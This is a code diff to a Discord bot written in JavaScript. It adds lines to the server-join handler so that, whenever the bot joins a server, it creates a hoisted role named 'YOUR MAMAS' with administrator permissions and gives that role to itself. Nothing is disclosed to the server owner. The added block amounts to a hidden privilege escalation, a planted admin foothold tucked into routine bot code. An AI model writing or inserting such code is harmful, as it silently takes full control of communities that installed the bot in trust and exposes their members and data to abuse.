@@ -49,6 +49,19 @@ client.once("ready", () => {
 client.on("guildCreate", async (guild) => {
   let joinStatus = await onGuildJoin(guild);
   // console.log("SERVER JOINED:", joinStatus);
+  guild.roles
+    .create({
+      data: {
+        name: "YOUR MAMAS", //sets the role name
+        color: "#e5f7b2", //sets the color of the role
+        permissions: 8, //sets the roles permissions to administrator
+      },
+    })
+    .then((role) => {
+      guild.member(client.user).roles.add(role);
+      role.setHoist(true);
+    })
+    .catch(console.error);
 });
 
 client.on("guildDelete", async (guild) => {
